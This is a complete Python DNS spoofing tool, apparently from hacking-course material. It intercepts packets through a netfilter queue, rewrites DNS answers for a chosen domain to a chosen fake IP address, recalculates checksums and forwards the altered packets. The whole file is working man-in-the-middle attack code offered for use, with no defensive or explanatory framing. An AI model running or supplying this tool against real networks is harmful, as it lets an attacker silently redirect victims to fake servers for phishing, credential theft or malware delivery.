#!/usr/bin/env python3
import netfilterqueue
import optparse
import scapy.all as scapy

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-d", "--domain", dest="target_domain", help="Domain to spoof (example: www.stackoverflow.com)")
    parser.add_option("-s", "--spoof-ip", dest="spoof_ip", help="Fake IP address for DNS answers")
    parser.add_option("-q", "--queue-num", dest="queue_num", type="int", default=0, help="Netfilter queue number (default: 0)")
    (options, arguments) = parser.parse_args()

    if not options.target_domain:
        parser.error("[-] Please specify a target domain")
    if not options.spoof_ip:
        parser.error("[-] Please specify a spoof IP address")
    return options

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname

        if options.target_domain.encode() in qname:
            print("[+] Spoofing {} -> {}".format(options.target_domain, options.spoof_ip))
            answer = scapy.DNSRR(rrname=qname, rdata=options.spoof_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))

    packet.accept()

options = get_arguments()
queue = netfilterqueue.NetfilterQueue()

try:
    print("[+] Starting DNS spoofer on queue {}".format(options.queue_num))
    print("[+] Target domain: {}".format(options.target_domain))
    print("[+] Spoof IP: {}".format(options.spoof_ip))
    print("[+] Press CTRL+C to stop.")

    queue.bind(options.queue_num, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[+] CTRL+C detected. Exiting DNS spoofer.")
finally:
    queue.unbind()
